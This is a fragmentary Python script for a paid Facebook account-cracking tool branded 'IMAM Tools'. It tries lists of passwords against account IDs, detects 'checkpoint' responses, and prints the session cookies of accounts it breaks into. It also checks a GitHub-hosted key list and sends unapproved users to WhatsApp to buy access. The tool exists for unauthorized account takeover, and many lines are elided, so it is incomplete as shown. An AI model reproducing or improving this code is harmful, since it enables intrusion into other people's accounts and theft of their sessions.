...
import urllib3,bashrich,base64
...
try:
	...
	print('[[\x1b[1;92m+\x1b[1;97m] [\x1b[1;96mIMAM')
...
#    username = input(' \033[0;92mEnter Username: ')
 ...
 #   if username == 'IMAM' and password == 'Love':
...
os.system('espeak -a 300 " Welcome,   to,  IMAM,   Tools"')
os.system('xdg-open https://www.facebook.com/IMAM.HOSSAIN.Ok.Bro')
def banner():
	os.system("clear")
	print (f"""
 ...
 |_   _|  \/  |  \/  |   /\   |  \/  |
   ...
   | | | |\/| | |\/| | / /\ \ | |\/| |
  _| |_| |  | | |  | |/ ____ \| |  | |
 |_____|_|  |_|_|  |_/_/    \_\_|  |_| \033[0;92m
╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\33[0;41m        [ WORKING ONLY MOBILE DATA ]         \033[0;92m║
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mIMAM HOSSAIN ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • IMAM HOSSAIN]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mIMAM HOSSAIN ]   ║\33[1;34m   
...
def login():
	...
	if IMAMin ['m']:
		...
		os.system('xdg-open https://wa.me/+8801754106662')
	elif IMAM in ['0']:
...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r{bo}[IMAM] {P}[{h}{loop}{P}]>~<[{h}{len(id)}{P}]{bo}•{P}[{h}Ok{P}•{bo}{ok}{P}] "),
	sys.stdout.flush()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				#IMAM
				#print(f'\r\033[0;94m[{time.strftime("%H:%M")}•IMAM-Cp] {idf} • {pw}')     
				...
				#IMAM HOSSAIN 
				print(f'\r\033[0;92m[{time.strftime("%H:%M")}•IMAM-Ok💚] {idf} • {pw}\n\033[0;93m[🌺]= COOKIES • \033[0;92m{kuki} ')
				print('\033[0;94m==============================================================')
				os.system('espeak -a 300 " IMAM,  Ok,  id"')
...
def Subscraption():
	...
	r1=requests.get("https://github.com/IMAM100/Public-CloNing-42o/blob/main/Approval.txt").text
	if key1 in r1:
		os.system('clear')
		login()
	else:
		...
		time.sleep(0.0010)
		print("\033[97;1m[\033[92;1m•\033[97;1m]\x1b[38;5;208m IMAM HOSSAIN, ToOLs Daily Update")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 7 DAYS 300 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m 15 DAYS 500 Tk")
		print("\033[97;1m[\033[92;1m•\033[97;1m]\33[0;92m Your Key  :\033[0;93m "+ak+IMAM+key1)
		...
		time.sleep(3.5)
		tks = 'Assalamu%20Alaikum-!💚,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+IMAM+''+key1
		os.system('am start https://wa.me/+8801754106662?text=' + tks)
		Subscraption() 
Subscraption() 
login()